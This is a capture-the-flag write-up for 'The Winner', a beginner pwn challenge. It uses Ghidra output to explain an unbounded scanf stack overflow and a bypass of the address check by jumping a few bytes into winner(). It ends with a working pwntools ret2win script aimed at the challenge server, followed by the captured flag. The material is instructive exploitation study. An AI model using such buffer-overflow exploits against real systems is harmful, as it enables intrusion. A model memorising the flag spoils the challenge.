## 10 - The Winner

### Description

**Solve**: 13/242

**Score**: 76

Wanna be the winner? Solve this.

Download: [https://stdio-2026-public.2600.in.th/10_easy_The_Winner.zip](https://stdio-2026-public.2600.in.th/10_easy_The_Winner.zip)

Author: Jusmistic

 `nc 157.230.193.18 10010`

### Solution
#### Step 1 Analysis

![](https://github.com/nkd3v/STDiO-CTF-2023-Writeup/assets/28519551/e894a9f8-bb11-4480-8d4a-bc0a089ecc62)

First off I started by trying to understand the program behavior, this will make it easier for us to understand when we trying to reverse engineer it, we can see that it just read input and echo out the output

To really know what going on we have to use tool like Ghidra to disassemble and decompile the program, these are the interesting function

```c
void winner(void)
{
  char local_78 [104];
  FILE *local_10;
  
  local_10 = fopen("/home/ctf/flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    perror("Error opening flag file");
    FUN_00401160(0xffffffff);
  }
  fgets(local_78,100,local_10);
  fclose(local_10);
  printf("Congratulations! You found the flag: %s\n",local_78);
  return;
}

undefined8 main(void)
{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("--- PING PONG SHOW ---");
  vuln();
  return 0;
}

void vuln(void)
{
  int iVar1;
  undefined local_88 [124];
  int local_c;
  
  printf("PING: ");
  __isoc99_scanf(&DAT_00402068,local_88);
  for (local_c = 0; local_c < 0xc9; local_c = local_c + 1) {
    iVar1 = memcmp(local_88 + local_c,&winnerAddress,8);
    if (iVar1 == 0) {
      puts("Nice try, but you can\'t use the address of the winner function!");
      FUN_00401160(1);
    }
  }
  printf("PONG: %s",local_88);
  return;
}
```

We can see that the program store the input data in `local_88` which has size of 124 without any input limit, which mean this program is vulnerable to overflow, if we write data beyond what the `local_88` can accept which is 124, data will start to overwrite other memory.

Due to how stack which is the memory region that store local variable is structured, it will first overwrite `iVar1` (4 bytes) then the saved `rbp` (8 bytes) and after that will be the return address (8 bytes)

By overwriting the return address we can redirect the execution of a program to any point we want, in this case the winner function which will print the flag when called

![](https://github.com/nkd3v/STDiO-CTF-2023-Writeup/assets/28519551/7e8b3a6d-3af9-4e8e-aec0-b953331bcb08)

![](https://github.com/nkd3v/STDiO-CTF-2023-Writeup/assets/28519551/00fe84b5-281c-4474-a8d0-bc3ffc0de32a)

In Ghidra, we can see that the `winner` function is located at `0x401256` but it will fail if we try to call it since the program have a check using `memcmp`.

The bypass is actually surprisingly easy, as we don't really have to call the function with its start address for it to work, we can skip a few instructions and it will be working just fine, in this case I skip `ENDBR64; PUSH RBP`, so we will redirect program to `0x40125b` instead

#### Step 2 Crafting Payload

The simplest way to craft an exploit is to use pwntools, for installation guide you can find it here: https://github.com/Gallopsled/pwntools

```python
from pwn import *

io = remote('157.230.193.18', 10010)

payload = b'A'*124 # overwrite string array local_88
payload += b'B'*4  # overwrite int iVar1
payload += b'C'*8  # overwrite saved rbp
payload += p64(0x40125B)

io.sendline(payload)

io.interactive()
```

First we open connection to the server with `io = remote('157.230.193.18', 10010)`, then we pad our payload with dummy characters then we use `p64` to convert our address to bytes which is the format needed for exploit to work properly

```
STDIO23_10{6ba7067210fa6da510cc17e5fd615ef7}
```

